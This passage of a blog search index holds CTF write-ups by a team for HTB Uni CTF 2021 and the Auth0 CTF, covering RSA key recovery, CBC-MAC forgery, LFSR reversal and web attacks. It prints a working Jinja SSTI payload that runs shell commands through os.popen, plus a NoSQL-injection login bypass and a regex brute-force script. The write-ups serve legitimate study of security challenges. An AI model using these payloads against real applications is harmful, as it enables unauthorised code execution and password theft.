redirect(&#39;/&#39;,code=302)app.run(debug=&#39;true&#39;)</code></pre><p><em>server.py</em></p><p>The <code>costume</code> is received as a POSTed parameter from the order and then rendered into the returned page.</p><p>This gives us the chance to try some SSTI here:</p><p><img src="/2021/11/22/HTB-Uni-CTF-2021-Quals/burp_costume.png" alt="screenshot of burp with SSTI"></p><p>As you can see we managed to get code execution. From that point you are free to use this entry for anything further, but to get the flag you can just use this payload:</p><p><code>costume=&#123;&#123;config.__class__.__init__.__globals__['os'].popen('cat /var/www/flag.txt').read()&#125;&#125;&amp;q=1&amp;addr=1</code></p><p> // much work of the aws stuff at the beginning was done by <a href="https://app.hackthebox.com/users/106666">Fabian</a> from TeamWBH</p><p> Thanks for reading. ~ <a href="https://twitter.com/hexp_">hexp</a> and <a href="https://twitter.com/JeanWhisky">JeanWhisky</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> Misc </tag>
            
            <tag> SQLi </tag>
            
            <tag> SSTI </tag>
            
            <tag> docker </tag>
            
            <tag> Fullpwn </tag>
            
            <tag> Maze </tag>
            
            <tag> AWS </tag>
            
            <tag> tarfile </tag>
            
            <tag> JWT </tag>
            
            <tag> HAProxy </tag>
            
            <tag> XSS </tag>
            
            <tag> Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Auth0 - CTF</title>
      <link href="/2021/10/27/Auth0-CTF/"/>
      <url>/2021/10/27/Auth0-CTF/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/10/27/Auth0-CTF/header.png"></p><p>The Auth0-CTF took place from the 18.10.2021 to the 25.10.2021. This was our first CTF as NocentSec, we managed to place 15th out of 613 teams with 1073 players in total as the best German team. The CTF was published by <a href="https://ctf.hackthebox.com/">HackTheBox</a> and organized by <a href="https://auth0.com/">Auth0</a>. Auth0 is an international enterprise which focuses on access security in web applications and well known community support. This was reflected in the variety of challenges which were heavily “Web” based.</p><h2 id="Scoreboard"><a href="#Scoreboard" class="headerlink" title="Scoreboard"></a>Scoreboard</h2><p><img src="/2021/10/27/Auth0-CTF/scoreboard.png"></p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>We were able to solve most of the challenges and especially enjoyed the web challenges. We want to showcase some challenges which we found interesting or had the feeling that we could reuse our scripts in the future for other CTFs, so this is also a knowledge database for ourselves.</p><h2 id="Crypto-Coffee-Stains"><a href="#Crypto-Coffee-Stains" class="headerlink" title="Crypto - Coffee Stains"></a>Crypto - Coffee Stains</h2><h3 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>We were given an incomplete RSA private key and an encrypted message.</p><pre><code>-----BEGIN RSA PRIVATE KEY--------------------------tdPNybMw3fakIhDT0tCl/i00i97lFiFFNV9u0jjQmpRRc8pwcQKCAQEAy2ebe5FlT3s2hGUGRsMXmEF9MF48p3P6Yk0+hB0XJLgDvAVhOCylLcuzNkolj//5mYoCjjBr4GdH5t3IAE/dBC1N8RQK/cc0FZ1DejJpV6TZUzLg6hef+tDAKMV52CWGFfc0XOWT0MKe/e3hZzYwBgFHLeVobZu5ngkHbk+ngta2fuJ7D1Fd/IRNs7Pu3hS3JNyjcpshshbEezI/8eYI12dd7CiAsv4GcDnnCdSqezKa5gGk0Adige6D0wIg01FtsTX7dwlaXXXpMrb479W63xWDgFVKKzjeK7GMlO6OO8o8SNnh4s0ezSUR6za6b/yAjHPtfpFTJ+nc1AEw+qNLawKCAQEApQRXpC75Y94dnwxZqjvEIkjCFipq5NQK3sjtbo33NdiO----------PS3/AoIBAHUnYBFwSB5e0yjX29DAHb85aJHUC4/p+s2wWODkaV4RIOz2PJyxoH9wA+HmxYIC/Kt2gpGtxBt2Cl4cjZR6qcnt/hEqTNs8Qtqma2MZMCvZI7W0mT+onwHJFHAAAIzHPvYcXvVWs+lUR1nd0XfVqWQ4j8+07yBBt1LGWFhW/N4cLSdPQrOAizQA9P63/RZTJQbdzKyOlJfE2eyY3PLGXjtQus7VK8eCHBlZU5bm4DX7aRT94siBk8SNrB9SUVb+94hdyqHsf7vN8ns2OwFqxXIim0BM2fqVbA9kIHblxP3FupoAKlbmuDrCRZZHABOiE9gwVn8oa64sDn7c5mtX2IECggEBAL9mDTqhXoAL/fXfZf1Voz7/I1hW----------END RSA PRIVATE KEY-----</code></pre><p><em>redacted_private_key.pem</em></p><p><a href="flag.enc">encrypted message</a></p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>We can restore some of the parameters of the RSA-encryption by comparing the incomplete key with a real key. Looking for the position and the magic numbers (described <a href="https://ret2school.github.io/post/writeuprsa/">here</a> and <a href="https://manylostticks.blogspot.com/2016/10/hacklu-ctf-2016-redacted-write-up.html">here</a>) we can find <code>p</code>, <code>upper_d</code>, <code>lower_q</code>, <code>dq</code> and some other fragments.</p><p>As this aren’t the same parameters as in the linked writeup we can’t just copy their code, but we can use our parameters with the help of <a href="mathemann.jpg">math</a>.</p><p><em>e is just guessed</em></p><p>To calculate q we replaced the d and q parameters in the script of the linked writeups:</p><pre><code class="py">from Crypto.Util.number import bytes_to_long, isPrimee = 0x10001p = 0xcb679b7b91654f7b3684650646c31798417d305e3ca773fa624d3e841d1724b803bc0561382ca52dcbb3364a258ffff9998a028e306be06747e6ddc8004fdd042d4df1140afdc734159d437a326957a4d95332e0ea179ffad0c028c579d8258615f7345ce593d0c29efdede16736300601472de5686d9bb99e09076e4fa782d6b67ee27b0f515dfc844db3b3eede14b724dca3729b21b216c47b323ff1e608d7675dec2880b2fe067039e709d4aa7b329ae601a4d0076281ee83d30220d3516db135fb77095a5d75e932b6f8efd5badf158380554a2b38de2bb18c94ee8e3bca3c48d9e1e2cd1ecd2511eb36ba6ffc808c73ed7e915327e9dcd40130faa34b6blower_d = 0xb5d3cdc9b330ddf6a42210d3d2d0a5fe2d348bdee5162145355f6ed238d09a945173ca7071upper_q = 0xa50457a42ef963de1d9f0c59aa3bc42248c2162a6ae4d40adec8ed6e8df735d88edq = 0x7527601170481e5ed328d7dbd0c01dbf396891d40b8fe9facdb058e0e4695e1120ecf63c9cb1a07f7003e1e6c58202fcab768291adc41b760a5e1c8d947aa9c9edfe112a4cdb3c42daa66b6319302bd923b5b4993fa89f01c9147000008cc73ef61c5ef556b3e9544759ddd177d5a964388fcfb4ef2041b752c6585856fcde1c2d274f42b3808b3400f4feb7fd16532506ddccac8e9497c4d9ec98dcf2c65e3b50baced52bc7821c19595396e6e035fb6914fde2c88193c48dac1f525156fef7885dcaa1ec7fbbcdf27b363b016ac572229b404cd9fa956c0f642076e5c4fdc5ba9a002a56e6b83ac24596470013a213d830567f286bae2c0e7edce66b57d881upper_invq_modp = 0xbf660d3aa15e800bfdf5df65fd55a33eff235856dp = d_mod_pm1_end = 0x3d2dfffor kq in range(1, e):    q_mul = dq * e - 1    if q_mul % kq == 0:        q = (q_mul // kq) + 1        if isPrime(q):            print(&quot;Potential q: &quot; + str(hex(q)))            break;n = p*qprint(&quot;potential n: &quot;)print(hex(n))print(&quot;#####&quot;)print(&quot;n&quot;)print(hex(n))print(&quot;e&quot;)print(hex(e))print(&quot;p&quot;)print(hex(p))print(&quot;q&quot;)print(str(hex(q)))</code></pre><p><em>get_q.py</em></p><p>Now we have all parameters to craft a new private key with a script like that:</p><pre><code class="py">from Crypto.PublicKey import RSAn = 0x831d3a77bc2df07236cd539febdf01da13942582edc7c83e5e4cfb85959647982a946286f0f395a6c6646aff486fb0b825524c08601e2a2fefa60887e4a29d463624c77a0ff3077c295413384eadb19197e08b731ed8ec8e806a1e81dd50eed15bffae5d62fa36bd93cc051617ab2e51c1a9624e634de5ef190246e54e9a398bcb97d17a5b2879210115a8e707075e881010337f25b4565ab4f65e4f92ecc3615a3e1e92528e0cad6eebd321272b7b6a801576bdfd4f8063b0fb940f0e1ef7eb21fc9017e632fa448f5f566b3509d17d2b33273ffa113f69ebc1756514bdc9782c96637e80a88fa726b6fdc5598ee2fdb77b500e50a6df037448900fe03e6da1c48f3602bda544871beae4f6d48b1f2a5e7c1e5cb4ab06fe478f22d00bcdc5d641445d979e8ede75283321d6e433134923593c7c78cdac67ea553af5f8b8aac12359880d22229118fa0360be098f03dc161c70db431dc63dc81224a809edaef0b364478f25f77836a4e510893f380962fb3ffc1e6c404ee9b4073ba662f4fddef7c1a15385e56a14d4df6886fba6a654545c399a287bfc603d582a9ff67644a5014cd7d6eb3f6ec6b90d19c90b74a45e35e8683c9020cc05bb77545cfe3fbfb9297dd011587038d15aee53737382d6e33e5757b43ca7b736b0d1cf53a74c546b28d03ba171c2d9421d0d5b8204da387102bac47412e828d04ab55483045a6265e = 0x10001q = 0xa50457a42ef963de1d9f0c59aa3bc42248c2162a6ae4d40adec8ed6e8df735d88e4037294db934bcd56908af941eaea6763eeeca63c5f2f05cb8bb38f689ac91e9dc13f1060446978af7950114e1be8dfeac53899e783ee9af21c44000c64b11979131bf80c152178230cc799acd1fa88184cc9d6587d6ee276d0bca083739890a9548c5358abb9f952d6c5a1f6b233008777af37923c6be12953b35f0b3542b37ef45753af6beb308bec02d650353f59b61672122b580e9ffea6a55d5f8b1e8186a18a5ce2eb403c6a72274827f284d565893c393efb5e9aa855e8523e514d5b3c30d67a75b491356463597e453fecf05a8394e84fd4ea7f2dae9ab2e78cd6fp = 0xcb679b7b91654f7b3684650646c31798417d305e3ca773fa624d3e841d1724b803bc0561382ca52dcbb3364a258ffff9998a028e306be06747e6ddc8004fdd042d4df1140afdc734159d437a326957a4d95332e0ea179ffad0c028c579d8258615f7345ce593d0c29efdede16736300601472de5686d9bb99e09076e4fa782d6b67ee27b0f515dfc844db3b3eede14b724dca3729b21b216c47b323ff1e608d7675dec2880b2fe067039e709d4aa7b329ae601a4d0076281ee83d30220d3516db135fb77095a5d75e932b6f8efd5badf158380554a2b38de2bb18c94ee8e3bca3c48d9e1e2cd1ecd2511eb36ba6ffc808c73ed7e915327e9dcd40130faa34b6bp=int(p)phi = (p-1)*(q-1)d = pow(e,-1,phi)key = RSA.construct((n,e,d,p,q))pem = key.exportKey(&#39;PEM&#39;)print(pem.decode())</code></pre><p><em>key.py</em></p><p>The new private key can be used to decrypt the given message (for example with <a href="https://gchq.github.io/CyberChef/#recipe=RSA_Decrypt('-----BEGIN%20RSA%20PRIVATE%20KEY-----','','RSA-OAEP','SHA-1')">CyberChef</a>).</p><h2 id="Crypto-Debunked"><a href="#Crypto-Debunked" class="headerlink" title="Crypto - Debunked"></a>Crypto - Debunked</h2><h3 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>This challenge is about AES in CBC mode.</p><p>We were given a server.py and an ip address with port for communication.<br>The application is used to authenticate keycards. Once we send a keycard with “permissionLvl=5” that gets authenticated we will receive the flag.</p><p>The application has two options:</p><ul><li>1 - Receive guest keycard<ul><li>crafts a new guest keycard based on the randomized key and iv with the plaintext <code>employeeID=ab12e&amp;permissionLvl=1</code></li><li>returns the guest keycard as: <code>base64(whole plaintext).base64(last 16 bytes of cyphertext).base64(IV)</code></li></ul></li><li>2 - Scan keycard to open door<ul><li>insert a keycard as: <code>base64(whole plaintext).base64(last 16 bytes of cyphertext)</code></li><li>returns: <ul><li>“Access denied” if permissionLvl != 5 and authenticated</li><li>“Caught forging fake keycards.” if not authenticated and “permissionLvl” in plaintext</li><li>expected signature (last 16 bytes of ciphertext) for given plaintext if not “permissionLvl” in plaintext</li></ul></li></ul></li></ul><pre><code class="py">from Crypto.Cipher import AESfrom secret import flagimport socketserverimport osfrom base64 import b64decode, b64encodeimport signalBLOCK_SIZE = 16KEY = os.urandom(BLOCK_SIZE)iv = os.urandom(BLOCK_SIZE)def reportError(val, check_sig, req):    if &quot;permissionLvl&quot; not in val.decode(&#39;utf-8&#39;, &#39;ignore&#39;):        req.sendall(b&quot;&gt; Something went wrong, expected signature: &quot;+ check_sig.encode() +b&quot;\n&quot;)    else:        req.sendall(b&quot;&gt; Caught forging fake keycards. This incident has been reported!\n&quot;)def macAuthenticate(mac, req):    val, sig = mac.split(&quot;.&quot;)    val = b64decode(val)    sig = b64decode(sig).decode()    cipher = AES.new(KEY, AES.MODE_CBC, iv)    ct = cipher.encrypt(val)    check_sig = ct[len(ct)-16:].hex()    if check_sig == sig:        return True    else:        reportError(val, check_sig, req)        return False def createLvl1Mac(id=b&quot;ab12e&quot;):    value = b&quot;employeeID=&quot;+id+b&quot;&amp;permissionLvl=1&quot;    cipher = AES.new(KEY, AES.MODE_CBC, iv)    ct = cipher.encrypt(value)    sig = ct[len(ct)-16:].hex().encode()    return b64encode(value)+b&quot;.&quot;+b64encode(sig)+b&quot;.&quot;+b64encode(iv.hex().encode())def challenge(req):    try:        req.sendall(b&#39;|------------------------------|\n&#39;+                    b&#39;|     KEYCARD ID CHECKER       |\n&#39;+                    b&#39;|------------------------------|\n&#39;+                    b&#39;|1. Receive guest keycard      |\n&#39;+                    b&#39;|2. Scan keycard to open door  |\n&#39;+                    b&#39;|------------------------------|\n&#39;+                    b&#39;\n&gt; &#39;                    )        choice = int(req.recv(2).decode().strip())        if choice == 1:            req.sendall(b&quot;&gt; Keycard ID: &quot;+createLvl1Mac()+b&quot;\n&quot;)        if choice == 2:            req.sendall(b&#39;&gt; Press keycard to the scanner...\n&#39;)            mac = req.recv(4096).decode().strip()            if macAuthenticate(mac, req):                val, _ = mac.split(&quot;.&quot;)                val = b64decode(val).decode()                val = dict(x.split(&quot;=&quot;) for x in val.split(&quot;&amp;&quot;))                if int(val.get(&#39;permissionLvl&#39;)) == 5:                    req.sendall(b&quot;&gt; Access granted! No alien robots here: &quot;+ flag+b&quot;\n&quot;)                else:                    req.sendall(b&quot;&gt; Access denied!&quot;+b&quot;\n&quot;)        except Exception as e:        try:            req.sendall(b&#39;Unexpected error.\n&#39;)            req.close()        except:            pass        exit()class incoming(socketserver.BaseRequestHandler):    def handle(self):        signal.alarm(300)        req = self.request        while True:            challenge(req)class ReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer):    passsocketserver.TCPServer.allow_reuse_address = Falseserver = ReusableTCPServer((&quot;0.0.0.0&quot;, 1337), incoming)server.serve_forever()</code></pre><p><em>server.py</em></p><p><img src="/2021/10/27/Auth0-CTF/standard.png"></p><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p><em>This challenge is kind of interesting because it’s not the expected bit-flipping attack to use here. This is caused by the use of a compare of encryptions for authentication instead of decryption.</em></p><p>We want to craft a keycard with “permissionLvl=5” and a valid ciphertext to use as the signature.<br>Sending a random plaintext (<em>length in bytes should be a factor of 16</em>) and a random ciphertext gives us the possibility to craft keycards by using the given expected signature in base64 as ciphertext.</p><p>It’s not necessary to have something about the employeID in the plaintext as only the permissionLvl gets checked. The only problem here is that we can’t just send “&amp;permissionLvl=5” as we would get the “caught forging keycards”-error instead of the expected signature. </p><p>We know the IV because it gets send to us in the applications response. This also means that we can control the output of our input XORed with the IV.<br>We can calculate which ciphertext the second plaintext (<em>second encrpytion step</em>) gets XORed with by crafting a new keycard.</p><p><img src="/2021/10/27/Auth0-CTF/encAES.png"></p><p>The key element here is to break out of thinking in 16 byte blocks. By this we can send parts of “permissionLvl=5” to bypass the check.</p><p>Following way leads us to a valid keycard:</p><ul><li>choose a plaintext for access like: 0000=0000&amp;permissionLvl=5&amp;00=000<ul><li>mind that this is 32 bytes long and neither in the first nor the second block is the whole “permissionLvl”</li><li>we need to add the symbols “=” and “&amp;” to get along with the splits</li></ul></li><li>C1: calculate the signature of the first 16 bytes of plaintext (“0000=0000&amp;permis”) by sending this as a keycard with a random ciphertext <ul><li>this returns a new signature which would be the first ciphertext in an encryption of a 32byte plaintext</li></ul></li><li>C2: calculate the signature of the last 16 bytes of plaintext (“sionLvl=5&amp;00=000”) by <strong>simulating the second step in encryption</strong>:<ul><li>eliminating the IV: new plaintext = “sionLvl=5&amp;00=000” XOR IV</li><li>new plaintext = new plaintext XOR C1 (<em>signature of first plaintext</em>)</li><li>sending this new plaintext in a keycard with a random cipher to get the signature</li></ul></li></ul><p>This got us the signature of the whole plaintext: C2.<br>Now we can just enter our valid keycard:</p><p><code>base64(&quot;0000=0000&amp;permissionLvl=5&amp;00=000&quot;).base64(C2)</code></p><h2 id="Crypto-Corporate-Snake"><a href="#Crypto-Corporate-Snake" class="headerlink" title="Crypto - Corporate Snake"></a>Crypto - Corporate Snake</h2><h3 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>We were given an encryption python script and a corresponding ciphertext. Our challenge was to reverse that ciphertext and retrieve the flag.</p><pre><code class="py">from base64 import b64encodeimport osdef bytes_to_bits(input):    return &#39;&#39;.join(format(i, &#39;08b&#39;) for i in input)def bits_to_bytes(input):    return int(input, 2).to_bytes((len(input) + 7) // 8, byteorder=&#39;big&#39;)flag = b&quot;--MISSING--&quot;init_state = os.urandom(4)def lfsr_keystream_generator(init_state, flag_bits_length, taps):    state = init_state    keystream = &#39;&#39;    for i in range(flag_bits_length):        keystream = keystream + state[-1]        state = state[:-1]        bit = state[taps[0]]        for tap in taps[1:]:            bit = int(bit) ^ int(state[tap])        state = str(bit) + state    return keystreamdef encrypt(keystream, plaintext):    plaintext = bytes_to_bits(plaintext)    ciphertext = &#39;&#39;    for i in range(len(plaintext)):        xored_bit = int(keystream[i]) ^ int(plaintext[i])        ciphertext = ciphertext + str(xored_bit)    return b64encode(bits_to_bytes(ciphertext))keystream = lfsr_keystream_generator(bytes_to_bits(init_state), len(bytes_to_bits(flag)),[2,3,5,7,11,17,19,29])ciphertext = encrypt(keystream, flag)print(ciphertext)</code></pre><p><em>enc.py</em></p><pre><code>+YXkzFFU86WugkASUernSAJz6ZSyFLHxrtba8wQVq3GRrjr7cib/3+9lt3JmtjKRhwFk/Q==</code></pre><p><em>ciphertext</em></p><h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p>The encryption script generates a <a href="https://en.wikipedia.org/wiki/Linear-feedback_shift_register">lfsr keystream</a> using a random init state by calling <code>os.random(4)</code>. Since we were given the encryption script we pretty much translated it to a solution script by reversing the transformation line by line. This was possible because we can recover the inital state by reversing the first 32bits of the restored keystream and also because we were given the taps used.</p><pre><code class="py"># Importsfrom base64 import b64encode, b64decodeimport os# Functionsdef bytes_to_bits(input):    return &#39;&#39;.join(format(i, &#39;08b&#39;) for i in input)def bits_to_bytes(input):    return int(input, 2).to_bytes((len(input) + 7) // 8, byteorder=&#39;big&#39;)def lfsr_keystream_generator(init_state, flag_bits_length, taps):    state = init_state    keystream = &#39;&#39;    for i in range(flag_bits_length):        keystream = keystream + state[-1]        state = state[:-1]        bit = state[taps[0]]        for tap in taps[1:]:            bit = int(bit) ^ int(state[tap])        state = str(bit) + state    return keystream# Variablesciphertext=b&quot;+YXkzFFU86WugkASUernSAJz6ZSyFLHxrtba8wQVq3GRrjr7cib/3+9lt3JmtjKRhwFk/Q==&quot;ciphertextbits=bytes_to_bits(b64decode(ciphertext))flag=b&quot;HTB&#123;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#125;&quot;flagbits = bytes_to_bits(flag)# Restoring keystreamkeystream_temp=&quot;&quot;for bit in range(len(ciphertextbits)):    xored_bit = int(ciphertextbits[bit]) ^ int(flagbits[bit])    keystream_temp = keystream_temp + str(xored_bit)keystream_first32bits = keystream_temp[:32]keystream_last8bits = keystream_temp[-8:]# Recovering inital stateintial_state=keystream_first32bits[::-1]# Decryptionkeystream_restored=lfsr_keystream_generator(intial_state, 416, [2,3,5,7,11,17,19,29])plainbits=&quot;&quot;for bit in range(len(ciphertextbits)):    xored_bit = int(ciphertextbits[bit]) ^ int(keystream_restored[bit])    plainbits = plainbits + str(xored_bit)plaintext=bits_to_bytes(plainbits)print(plaintext)</code></pre><p><em>solve.py</em></p><h2 id="Misc-Bomb"><a href="#Misc-Bomb" class="headerlink" title="Misc - Bomb"></a>Misc - Bomb</h2><h3 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>We were given an ip adress with a port. Once connected via netcat we were asked to solve 777 maths challenges in order to retrieve the flag.</p><h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h3><p>While this isn’t a difficult or very exciting challenge we decided to share our script here nontheless because this is quite a common ctf challenge and we might reuse it in the future.</p><pre><code class="py">#!/usr/bin/python3import itertoolsimport nclibimport sysimport collectionsfrom time import timeip = &#39;167.99.202.9&#39;port = 32597### connecting to the socket and recieving until &#39;= ?&#39;:nc = nclib.Netcat((ip, port), verbose=True)start = &quot;= ?&quot;recv = nc.recv_until(start.encode(&#39;utf-8&#39;))### splitting the task to get rid of the useless informationtext, term = recv.decode().split(&#39;\n\n&#39;)### evaluate the solution and send itsolution= eval(term[:-4])nc.send(str(solution) + &#39;\n&#39;)### do all of the above repeatedlywhile 1:    recv = nc.recv_until(start.encode(&#39;utf-8&#39;))    a, b, term = recv.decode().split(&#39;\n\n&#39;)    solution= eval(term[:-4])    print (term)    print (solution)    nc.send(str(solution) + &#39;\n&#39;)</code></pre><p><em>bomb.py</em></p><h2 id="Web-Status-Board"><a href="#Web-Status-Board" class="headerlink" title="Web - Status Board"></a>Web - Status Board</h2><p><img src="/2021/10/27/Auth0-CTF/statusboard_admin.png"></p><h3 id="Challenge-Description-4"><a href="#Challenge-Description-4" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>What looks like a simple authentication bypass in the first place is not what it seems. In this challenge our task wasn’t to just bypass the login form, we had to retrieve the admin password. This became clear looking at the <code>entrypoint.sh</code> which we were given.</p><pre><code class="sh">#!/bin/ash# Secure entrypointchmod 600 /entrypoint.shmkdir /tmp/mongodbmongod --noauth --dbpath /tmp/mongodb/ &amp;sleep 2mongo status_board --eval &quot;db.createCollection(&#39;users&#39;)&quot;mongo status_board --eval &#39;db.users.insert( &#123; username: &quot;admin&quot;, password: &quot;HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;&quot;&#125; )&#39;/usr/bin/supervisord -c /etc/supervisord.conf</code></pre><p><em>entrypoint.sh</em></p><h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h3><p>The vulnerabiliy is called NoSQL Injection or MongoDB Injection. We found out that we could successful “login” using this:</p><pre><code class="json">&#123;    &quot;email&quot; : &#123;&quot;$gt&quot;:&quot;&quot;&#125;,    &quot;password&quot; : &#123;&quot;$gt&quot;:&quot;&quot;&#125;&#125;</code></pre><p><code>$gt</code> means <code>greater than</code>, so in this case it would pick any username that is <code>greater than nothing</code> and the corresponding password. This gave us confidence about this attack. However the challenge here was to extract the password because that’s were the flag is stored. So we figured we can also use regex to enumerate the flag character by character. As long as the following returns <code>User authenticated successfully!</code> we’ve only put in valid characters.</p><pre><code class="json">&#123;    &quot;username&quot; : &#123;&quot;$eq&quot;:&quot;admin&quot;&#125;,    &quot;password&quot; : &#123;&quot;$regex&quot;:&quot;^HTB&#123;&quot;&#125;&#125;</code></pre><p>Because that would be quite painful to do by hand we wrote this short script which tries every character in the given alphabet and continues to the next one after the response would not include the word <code>Invalid</code>.</p><pre><code class="py">#!/usr/bin/env python3import requestsurl = &#39;http://167.99.94.53:30169/api/login&#39;alphabet=&quot;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789_&#123;&#125;&quot;solved=&quot;&quot;while 1:    for c in alphabet:        myobj = &#123;&#39;username&#39;: &#39;admin&#39;,&#39;password&#39; : &#123;&quot;$regex&quot;:&quot;^&quot;+solved+c&#125;&#125;        x = requests.post(url, json = myobj)        if &quot;Invalid&quot; not in x.text:            solved=solved + c            print(solved)</code></pre><p><em>nosql.py</em>  </p><p><em>Thanks for reading. ~ hexp and JeanWhisky</em></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Auth0 </tag>
            
            <tag> HackTheBox </tag>
            
            <tag> NoSQL </tag>
            
            <tag> RSA </tag>
            
            <tag> AES </tag>
            
            <tag> Crypto </tag>
            
            <tag> Web </tag>
            
            <tag> Misc </tag>
            
            <tag> HTB </tag>
            
            <tag> LFSR </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
